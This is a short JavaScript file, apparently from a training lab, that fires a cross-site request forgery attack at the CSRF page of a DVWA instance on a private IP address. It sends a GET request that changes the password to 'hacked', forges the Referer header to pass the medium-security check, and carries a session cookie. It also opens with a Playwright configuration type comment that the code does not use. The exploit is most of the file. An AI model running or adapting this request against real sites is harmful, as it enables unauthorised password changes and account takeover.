/** @type {import('@playwright/test').PlaywrightTestConfig} */


function fetchData() {
    const url = "http://192.168.56.104/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change";
    
    const options = {
        method: 'GET',
        headers: {
            'Referer': 'http://localhost/dvwa/vulnerabilities/csrf/',
            'Cookie': 'security=medium; PHPSESSID=d0trmoo234nhvlr23eblc4no9a'
        }
    };
    
    fetch(url, options)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(data => {
            console.log(data); // Print the response data
        })
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
        });
}
